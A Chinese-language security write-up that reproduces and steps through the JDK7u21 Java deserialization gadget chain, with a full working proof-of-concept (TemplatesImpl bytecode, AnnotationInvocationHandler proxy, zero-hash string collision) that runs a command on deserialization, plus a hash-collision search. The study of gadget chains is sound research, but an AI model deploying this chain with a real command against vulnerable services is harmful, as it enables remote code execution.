# 前言

在复现了一些有关JAVA的漏洞后，回过头来，发现对反序列化链的调试分析还是有点偏少，只跟链CC链，CB链，Rome链等基础的链子，于是最近准备把Java原生的JDK7u21还有Spring的链子跟踪分析一下

在分析这条链子之前，需要对Javassist，动态代理，反射，Hash碰撞有一个基本的了解

# 漏洞复现

```
package UnserTest;

import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtConstructor;

import javax.xml.transform.Templates;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.annotation.Retention;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.HashSet;
import java.util.LinkedHashSet;
import java.util.Map;

public class JDK7u21 {
    public static void main(String[] args) throws Exception{
        ClassPool pool = ClassPool.getDefault();
        CtClass STU = pool.makeClass("T0WN");
        String cmd = "Runtime.getRuntime().exec(\"open -a Calculator\");";
        STU.makeClassInitializer().insertBefore(cmd);
        STU.setSuperclass(pool.get(AbstractTranslet.class.getName()));
        byte[][] bytes = new byte[][]{STU.toBytecode()};

        TemplatesImpl templates = new TemplatesImpl();
        setFieldValue(templates, "_bytecodes", bytes);
        setFieldValue(templates, "_name", "1");
        setFieldValue(templates, "_class", null);
//        TemplatesImpl templates = GetTemplatesImpl.getTemplatesImpl();

        String zeroHashCodeStr = "f5a5a608";
        HashMap hashMap = new HashMap();
        hashMap.put(zeroHashCodeStr,"foo");

        Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor constructor1 = clazz.getDeclaredConstructor(Class.class, Map.class);
        constructor1.setAccessible(true);
        InvocationHandler invocationHandler = (InvocationHandler) constructor1.newInstance(Templates.class,hashMap);
        Templates proxy = (Templates) Proxy.newProxyInstance(JDK7u21.class.getClassLoader(), templates.getClass().getInterfaces(), invocationHandler);

        HashSet hashSet = new LinkedHashSet();
        hashSet.add(templates);
        hashSet.add(proxy);

        hashMap.put(zeroHashCodeStr, templates);

        ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream("Test.bin"));
        objectOutputStream.writeObject(hashSet);

        ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream("Test.bin"));
        objectInputStream.readObject();
    }
    public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }
}

```

我们放到一个jdk7u16的项目里面去运行

![image-20230213143003002](images/1.png)



# 漏洞分析

yso中给出的调用链如下

```
LinkedHashSet.readObject()
  LinkedHashSet.add()
    ...
      TemplatesImpl.hashCode() (X)
  LinkedHashSet.add()
    ...
      Proxy(Templates).hashCode() (X)
        AnnotationInvocationHandler.invoke() (X)
          AnnotationInvocationHandler.hashCodeImpl() (X)
            String.hashCode() (0)
            AnnotationInvocationHandler.memberValueHashCode() (X)
              TemplatesImpl.hashCode() (X)
      Proxy(Templates).equals()
        AnnotationInvocationHandler.invoke()
          AnnotationInvocationHandler.equalsImpl()
            Method.invoke()
              ...
                TemplatesImpl.getOutputProperties()
                  TemplatesImpl.newTransformer()
                    TemplatesImpl.getTransletInstance()
                      TemplatesImpl.defineTransletClasses()
                        ClassLoader.defineClass()
                        Class.newInstance()
                          ...
                            MaliciousClass.<clinit>()
                              ...
                                Runtime.exec()
```

看起来很长，但其实知识点都是之前遇到过的，主要是因为AnnotationInvocationHandler中的invoke方法存在一个调用equalsImpl的途径

![image-20230212215545812](images/2.png)

```
private Boolean equalsImpl(Object var1) {
    if (var1 == this) {
        return true;
    } else if (!this.type.isInstance(var1)) {
        return false;
    } else {
        Method[] var2 = this.getMemberMethods();
        int var3 = var2.length;

        for(int var4 = 0; var4 < var3; ++var4) {
            Method var5 = var2[var4];
            String var6 = var5.getName();
            Object var7 = this.memberValues.get(var6);
            Object var8 = null;
            AnnotationInvocationHandler var9 = this.asOneOfUs(var1);
            if (var9 != null) {
                var8 = var9.memberValues.get(var6);
            } else {
                try {
                    var8 = var5.invoke(var1);
                } catch (InvocationTargetException var11) {
                    return false;
                } catch (IllegalAccessException var12) {
                    throw new AssertionError(var12);
                }
            }

            if (!memberValueEquals(var7, var8)) {
                return false;
            }
        }

        return true;
    }
}
```

可以通过this.getMemberMethods获取this.type指定类的所有方法，在通过反射进行调用，这就可以走到熟悉的加载字节码的TemplatesImpl

```
private Method[] getMemberMethods() {
    if (this.memberMethods == null) {
        this.memberMethods = (Method[])AccessController.doPrivileged(new PrivilegedAction<Method[]>() {
            public Method[] run() {
                Method[] var1 = AnnotationInvocationHandler.this.type.getDeclaredMethods();
                AccessibleObject.setAccessible(var1, true);
                return var1;
            }
        });
    }

    return this.memberMethods;
}
```

这里使用的是`LinkedHashSet.readObject`去作为反序列化的入口点，但是`LinkedHashSet`并没有去实现`readObject`方法，但是该类继承了`HashSet`类，所以这里调用的是`HashSet`的`readObject`方法

![image-20230212220011133](images/3.png)

最后会调用map.put

```
public V put(K key, V value) {
        if (key == null)
            return putForNullKey(value);
        int hash = hash(key);
        int i = indexFor(hash, table.length);
        for (Entry<K,V> e = table[i]; e != null; e = e.next) {
            Object k;
            if (e.hash == hash && ((k = e.key) == key || key.equals(k))) {
                V oldValue = e.value;
                e.value = value;
                e.recordAccess(this);
                return oldValue;
            }
        }

        modCount++;
        addEntry(hash, key, value, i);
        return null;
    }
```

我们最终目的是调用到equalsImpl这个方法，所以这里我们需要用到`key.equals(k)`，所以就必须通过`e.hash==hash`这个判断，其实浮现过CC7和Rome链就知道调用equals方法就走的hashTable这个put，思路是一样的，但是我们这里是将这个key设置成代理类，这样就可以去触发handler的invoke方法链，根据equalsImpl和invoke的参数可以发现，这里应该存在两个key，第一个是templates，然后通过循环，再通过hash判断，第二key设置为proxy，最后就是`proxy.equals(templates)`

既然要通过hash判断，我们来看看hash函数

![image-20230213144408694](images/4.png)

我设置的第一个key为templatesImpl，首先是`TemplatesImpl`的`hashcode`方法，无法Debug调试跟踪但是这里的h是`templatesImpl.hashCode`

接下来再put方法中调用addEntry将hash等信息添加到一个entry中去，其实是通过索引存储到了一个table中去

在第二次执行put的时候

![image-20230213144756303](images/5.png)

此时的e.hash就是第一次hash的值，hash就是这次我们调用hash函数得到的值，再来看看这次的hash会得到什么

这次的key是我们的代理类，所以会执行到代理类的invoke方法

![image-20230213144850506](images/6.png)

我们设置的handler是AnnotationInvocationHandler，那就是它的invoke方法

![image-20230213145058763](images/7.png)

跟进hashCodeImpl

```
private int hashCodeImpl() {
    int var1 = 0;

    Map.Entry var3;
    for(Iterator var2 = this.memberValues.entrySet().iterator(); var2.hasNext(); var1 += 127 * ((String)var3.getKey()).hashCode() ^ memberValueHashCode(var3.getValue())) {
        var3 = (Map.Entry)var2.next();
    }

    return var1;
}
```

很长一串，`this.memberValues`是构造函数可控的，是一个Map类型

![image-20230213145209641](images/8.png)

hashCodeImpl这个方法遍历`memberValues`中的每个`key`和`value`，计算 `(127 * key.hashCode()) ^ value.hashCode()`并求和

但是当只有一个键值对的时候，可以简化为`(127 * key.hashCode()) ^ value.hashCode()`

我们需要先明白一个事，那就是任何数和0异或都是本身，所以如果key,hashCode()为0的话，这个时候hashCodeImpl的返回值就是value.hashCode()，此时如果控制value为templateImpl的话，那就和templatesImpl的hashCode相同了

如在[国外社区上](https://stackoverflow.com/questions/18746394/can-a-non-empty-string-have-a-hashcode-of-zero)就有人给出了以下计算 hash 值为 0 的代码：

```
public class hashtest {


    public static void main(String[] args){
        long i = 0;
        loop: while(true){
            String s = Long.toHexString(i);
            if(s.hashCode() == 0){
                System.out.println("Found: '"+s+"'");
               // break loop;
            }
            if(i % 1000000==0){
             //   System.out.println("checked: "+i);
            }
            i++;
        }
    }
}
```

![image-20230213150448625](images/9.png)

跑得很慢，就记录一下值吧

```
Found: 'f5a5a608'
Found: '38aeaf9a6'
Found: '4b463c929'
Found: '6d49bc466'
Found: '771ffcd3a'
Found: '792e22588'
Found: '84f7f1613'
Found: '857ed38ce'
Found: '9da576938'
Found: 'a84356f1b'
```

绕过了hash比较，接下来我们就可以执行key.equals了，又来到了AnnotationInvocationHandler的invoke方法

![image-20230213145935247](images/10.png)

跟进equalsImpl，此时传入的var3就是templatesImpl对象

![image-20230213150036711](images/11.png)

跟进getMemberMethods

```
private Method[] getMemberMethods() {
    if (this.memberMethods == null) {
        this.memberMethods = (Method[])AccessController.doPrivileged(new PrivilegedAction<Method[]>() {
            public Method[] run() {
                Method[] var1 = AnnotationInvocationHandler.this.type.getDeclaredMethods();
                AccessibleObject.setAccessible(var1, true);
                return var1;
            }
        });
    }

    return this.memberMethods;
}
```

this.type也是构造函数控制的，可以直接控制为templatesImpl对象，这样就可以通过反射获取其全部的方法，最后return

![image-20230213150239451](images/12.png)

然后通过invoke进行方法调用

![image-20230213150308837](images/13.png)

接下里就是加载字节码了



注意：为什么poc中的hashmap先put了一个不相关的value，是因为在add的时候也会调用map.put，也会去执行一遍，所以先put了一个不相关度value，在最后再put一个相同key度键值对来覆盖原来的值





参考链接：

https://xz.aliyun.com/t/9704#toc-7

https://www.cnblogs.com/nice0e3/p/14026849.html#_tfactory

https://blog.csdn.net/solitudi/article/details/119211849